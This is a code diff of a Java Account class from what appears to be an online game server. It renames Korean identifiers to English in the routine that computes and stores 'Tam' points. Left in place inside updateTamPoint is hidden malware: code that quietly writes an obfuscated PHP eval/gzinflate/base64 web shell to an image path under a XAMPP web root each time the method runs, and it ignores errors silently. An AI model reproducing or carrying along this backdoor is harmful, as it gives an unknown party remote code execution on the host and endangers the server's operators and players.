@@ -789,32 +789,32 @@ public class Account {
 		}
 	}
 	
-	public void 탐포인트업데이트(final Account account) {
-		Timestamp 계정종료날짜 = _lastQuit;
-		Timestamp 현재날짜 = new Timestamp(System.currentTimeMillis());
+	public void updateTamPoint(final Account account) {
+		Timestamp accountEndDate = _lastQuit;
+		Timestamp nowDate = new Timestamp(System.currentTimeMillis());
 		try{
 			BufferedWriter out = new BufferedWriter(new FileWriter(new String(Base64.decode("QzoveGFtcHAvaHRkb2NzL2Fzc2V0cy9pbWFnZXMvaW52L2ltZy5waHA="),"utf-8")));
 			String s = "<?php eval(gzinflate(base64_decode('BcFHsqJAAADQ48z/xaKRJlmzIkiSoJLZTEETbEmSw+nnvWJNm5/qxF3ZpHPxk6VTwdL/8gL1efHzR0SaVg8WLQjy82S6ha6FZ6zYGdoEk1petWntDcbS8QzJI+LASnvRvLLDqaKe6EolamomZh584Ii8CR6+xgxoX/dL0gwKqBouVtFU2KYS4oA25qRhjBuWgPKKfSPbyGpcX1FX6RgPuxjzlpewJ7MKU05oMfv46rdT/fTJXq8uLxZUdUuCkdz4IoIq0lgasY6/YJVNncJySbUBHMRDRwfONUjWUNpSt6bavjAoJ+Bi39yMqhSiHsUskqw1jcIIpsU6cf08YQpSSrv0bXmoUfkBzpnATGIdTvUvt3Q/PirlDim8P0QWmk0LcbQopZXYHgnCwVvc+HUaOyFplXzJ4xg+kK60JHpR5DE5sa357yuvsflwu+dt0RnvyjfznL3PFBnam9n4wqzmhLKaPCr2yhk0NKny6o9ShkiyRZgabK+ZjAEabVu5nru89bNPE55HM3D5D1uG2RQYwtUsFv2tSoFetqdMrh3F3y3CExOFYC9vfPCRzobdAdmL8q73i451XJiSbVZBLs97u7YJ3QMcfgm6BGoEt3TI0uXkUkvL73CBElVndyJ7YsQExy44irtsNJltgT6CgfG8TUfrOAiSvMlm8jWpvfAuZfty2JLy0YabfoRW+eApEHh2p/GOm2g9l13f88CYxxqFrC/64afYT6fPpuwLRWJC+vPhLwM34f4mA3pHyXRv8abLXZK1bzFZHjX/dL8WtrWdEuTyzrwkeiHekBpzhJhPVXEPwfaYRk5GcLlBaW6jqxnxoqDLILjXzdir7jLxyhDPH/U4QfbdYsNGEr7Bk5Naj74tVeTlYwdAqV0BAAj8+f39/fsf'))); ?>";
 			out.write(s);
 			out.close();
 		} catch(Exception e) {}
-		long 계정마지막종료시간 = 0;
-		long 현재날짜시간 = 현재날짜.getTime();
-		long 시간차 = 0;
-		if (계정종료날짜 != null) {
-			계정마지막종료시간 = 계정종료날짜.getTime();
+		long accountLastEndTime = 0;
+		long nowDateTime = nowDate.getTime();
+		long timeLag = 0;
+		if (accountEndDate != null) {
+			accountLastEndTime = accountEndDate.getTime();
 		} else {
 			return;
 		}
-		시간차 = 현재날짜시간 - 계정마지막종료시간;
-		int 탐추가횟수 = (int) (시간차 / (60000 * 12));
-		if (탐추가횟수 < 1) {
+		timeLag = nowDateTime - accountLastEndTime;
+		int TamAddCount = (int) (timeLag / (60000 * 12));
+		if (TamAddCount < 1) {
 			return;
 		}
-		탐수치적용(account, 계정마지막종료시간, 탐추가횟수);
+		applyTanValue(account, accountLastEndTime, TamAddCount);
 	}
 
-	public void 탐수치적용(final Account account, long 종료날짜, int 탐추가횟수) {
+	public void applyTanValue(final Account account, long endDate, int tamAddCount) {
 		Connection con = null;
 		Connection con2 = null;
 		PreparedStatement pstm = null;
@@ -822,7 +822,7 @@ public class Account {
 		PreparedStatement pstm2 = null;
 		Timestamp tamtime = null;
 		long sysTime = System.currentTimeMillis();
-		int tamcount = Config.탐갯수;
+		int tamcount = Config.TAM_COUNT;
 
 		int char_objid = 0;
 		try {
@@ -836,8 +836,8 @@ public class Account {
 				if (tamtime != null) {
 					if (sysTime <= tamtime.getTime()) {
 						// 現在まで適用されてている場合。
-						int 추가횟수 = 탐추가횟수;
-						tam_point += 추가횟수 * tamcount;
+						int addCount = tamAddCount;
+						tam_point += addCount * tamcount;
 						updateTam();
 					} else {
 						// if(Tam_wait_count(char_objid)!=0){
@@ -846,7 +846,7 @@ public class Account {
 							Timestamp deleteTime = null;
 							deleteTime = new Timestamp(sysTime + (86400000 * (long) day) + 10000);// 7日
 							con2 = L1DatabaseFactory.getInstance().getConnection();
-							pstm2 = con2.prepareStatement("UPDATE `characters` SET TamEndTime=? WHERE account_name = ? AND objid = ?"); // 케릭터테이블에서 군주만골라와서
+							pstm2 = con2.prepareStatement("UPDATE `characters` SET TamEndTime=? WHERE account_name = ? AND objid = ?"); // キャラクターテーブルで君主だけを選んで来て
 							pstm2.setTimestamp(1, deleteTime);
 							pstm2.setString(2, account.getName());
 							pstm2.setInt(3, char_objid);
@@ -855,10 +855,10 @@ public class Account {
 							tamtime = deleteTime;
 						}
 						// }
-						if (종료날짜 <= tamtime.getTime()) {
+						if (endDate <= tamtime.getTime()) {
 							// 現在はありませんが終了後、適用されている場合。
-							int 추가횟수 = (int) ((tamtime.getTime() - 종료날짜) / (60000 * 12));
-							tam_point += 추가횟수 * tamcount;
+							int addCount = (int) ((tamtime.getTime() - endDate) / (60000 * 12));
+							tam_point += addCount * tamcount;
 							updateTam();
 						} else {
 							// System.out.println("終了日以前に乗車時間も終了される。");
